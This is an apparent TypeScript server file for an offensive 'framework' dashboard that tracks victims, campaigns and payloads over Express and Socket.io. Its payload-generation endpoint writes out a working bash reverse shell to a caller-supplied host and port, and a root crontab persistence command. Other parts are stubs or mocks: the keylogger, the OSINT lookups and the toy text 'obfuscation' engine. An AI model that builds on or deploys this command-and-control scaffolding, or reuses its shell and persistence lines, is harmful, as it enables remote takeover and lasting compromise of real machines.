import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import { createServer as createViteServer } from "vite";
import path from "path";
import cors from "cors";

async function startServer() {
  const app = express();
  const httpServer = createServer(app);
  const io = new Server(httpServer, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
  });

  app.use(cors());
  app.use(express.json());

  // Mock database for the demo
  const victims = new Map();
  const payloads = [
    { id: "p1", name: "Nightfury Reverse Shell", type: "Reverse Shell", platform: "Linux", obfuscation: "High" },
    { id: "p2", name: "Divine Eye Keylogger", type: "Keylogger", platform: "Windows", obfuscation: "Medium" },
    { id: "p3", name: "Quantum Entanglement Payload", type: "XSS", platform: "Web", obfuscation: "Polymorphic" },
  ];

  const campaigns = [
    { id: "c1", name: "Operation Dark Star", status: "Active", targets: 124, pwned: 42 },
    { id: "c2", name: "Project Divine Eye", status: "Paused", targets: 50, pwned: 12 },
  ];

  // API Routes
  app.get("/api/stats", (req, res) => {
    res.json({
      totalVictims: victims.size,
      activeCampaigns: campaigns.length,
      payloadsDeployed: 87,
      uptime: process.uptime()
    });
  });

  app.get("/api/payloads", (req, res) => {
    res.json(payloads);
  });

  app.get("/api/campaigns", (req, res) => {
    res.json(campaigns);
  });

  // --- Advanced Obfuscation Logic ---

  const jadenCase = (text: string) => {
    return text.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
  };

  const customBase64 = (text: string) => {
    const standard = Buffer.from(text).toString('base64');
    // Simple variation: swap '+' with '-' and '/' with '_' (URL safe-ish)
    return standard.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  };

  const flipText = (text: string) => {
    const charMap: Record<string, string> = {
      'a': 'ɐ', 'b': 'q', 'c': 'ɔ', 'd': 'p', 'e': 'ǝ', 'f': 'ɟ', 'g': 'ƃ', 'h': 'ɥ', 'i': 'ᴉ', 'j': 'ɾ',
      'k': 'ʞ', 'l': 'l', 'm': 'ɯ', 'n': 'u', 'o': 'o', 'p': 'd', 'q': 'b', 'r': 'ɹ', 's': 's', 't': 'ʇ',
      'u': 'u', 'v': 'ʌ', 'w': 'ʍ', 'x': 'x', 'y': 'ʎ', 'z': 'z',
      'A': '∀', 'B': 'ᗺ', 'C': 'Ɔ', 'D': 'ᗡ', 'E': 'Ǝ', 'F': 'Ⅎ', 'G': '⅁', 'H': 'H', 'I': 'I', 'J': 'ᒋ',
      'K': 'ʞ', 'L': '˥', 'M': 'W', 'N': 'N', 'O': 'O', 'P': 'Ԁ', 'Q': 'Ό', 'R': 'ᴚ', 'S': 'S', 'T': '⊥',
      'U': '∩', 'V': 'Λ', 'W': 'M', 'X': 'X', 'Y': '⅄', 'Z': 'Z',
      '1': 'Ɩ', '2': 'ᄅ', '3': 'Ɛ', '4': 'ㄣ', '5': 'ϛ', '6': '9', '7': 'ㄥ', '8': '8', '9': '6', '0': '0',
      '.': '˙', ',': "'", '\'': ',', '"': '„', '?': '¿', '!': '¡', '(': ')', ')': '(', '[': ']', ']': '[', '{': '}', '}': '{', '<': '>', '>': '<', '_': '‾'
    };
    return text.split('').map(c => charMap[c] || c).reverse().join('');
  };

  const analyzeValence = (text: string) => {
    const lowValence = ['test', 'hello', 'debug'];
    const highValence = ['password', 'admin', 'root', 'secret', 'exploit'];
    
    const lower = text.toLowerCase();
    if (highValence.some(word => lower.includes(word))) return 'high';
    if (lowValence.some(word => lower.includes(word))) return 'low';
    return 'medium';
  };

  // --- API Endpoints ---

  app.post("/api/engine/obfuscate", (req, res) => {
    const { text, technique, autoValence } = req.body;
    if (!text) return res.status(400).json({ error: "No text provided" });
    
    let result = text;
    const valence = autoValence ? analyzeValence(text) : 'manual';

    // Dynamic selection based on valence or explicit technique
    const selectedTechnique = technique || (valence === 'high' ? 'polymorphic' : valence === 'medium' ? 'base64' : 'jaden');

    switch (selectedTechnique) {
      case 'polymorphic':
        result = flipText(text);
        break;
      case 'base64':
        result = customBase64(text);
        break;
      case 'jaden':
        result = jadenCase(text);
        break;
      default:
        result = text;
    }

    res.json({ 
      obfuscated: result, 
      technique: selectedTechnique,
      valence 
    });
  });

  app.post("/api/payloads/generate", (req, res) => {
    const { type, platform, options } = req.body;
    
    // Sophisticated auto-payload generation logic
    const templates: Record<string, string> = {
      'reverse_shell': `bash -i >& /dev/tcp/${options.host || '127.0.0.1'}/${options.port || '4444'} 0>&1`,
      'keylogger': `[LOG_INIT] Hooking keyboard on ${platform}...`,
      'persistence': `echo "@reboot /usr/bin/python3 /tmp/agent.py" >> /etc/crontab`
    };

    const payload = templates[type] || "GENERIC_VECTOR_v1.0";
    const obfuscated = options.obfuscate ? customBase64(payload) : payload;

    res.json({ 
      id: `PL-${Math.floor(Math.random() * 10000)}`,
      content: obfuscated,
      type,
      platform,
      timestamp: new Date()
    });
  });

  app.get("/api/osint/search", (req, res) => {
    const { query } = req.query;
    // Simulated OSINT tool output
    res.json([
      { source: 'Whois', data: `Domain: ${query}, Registered: 2023-01-01` },
      { source: 'Shodan', data: `IP: 1.2.3.4, Ports: 80, 443, 22` },
      { source: 'GitHub', data: `Found 3 repositories matching ${query}` }
    ]);
  });

  app.get("/api/campaigns/export", (req, res) => {
    // Export logic
    res.json({ 
      campaign_data: campaigns,
      export_id: `EXP-${Date.now()}`,
      format: 'JSON'
    });
  });

  // Socket.io for real-time updates
  io.on("connection", (socket) => {
    console.log("Operator connected:", socket.id);
    
    socket.on("register_victim", (data) => {
      const victim = { id: socket.id, ...data, timestamp: new Date() };
      victims.set(socket.id, victim);
      io.emit("victim_update", Array.from(victims.values()));
    });

    socket.on("disconnect", () => {
      victims.delete(socket.id);
      io.emit("victim_update", Array.from(victims.values()));
    });
  });

  // Vite integration
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  const PORT = 3000;
  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`L33TS33KV9 Framework active on http://localhost:${PORT}`);
  });
}

startServer();
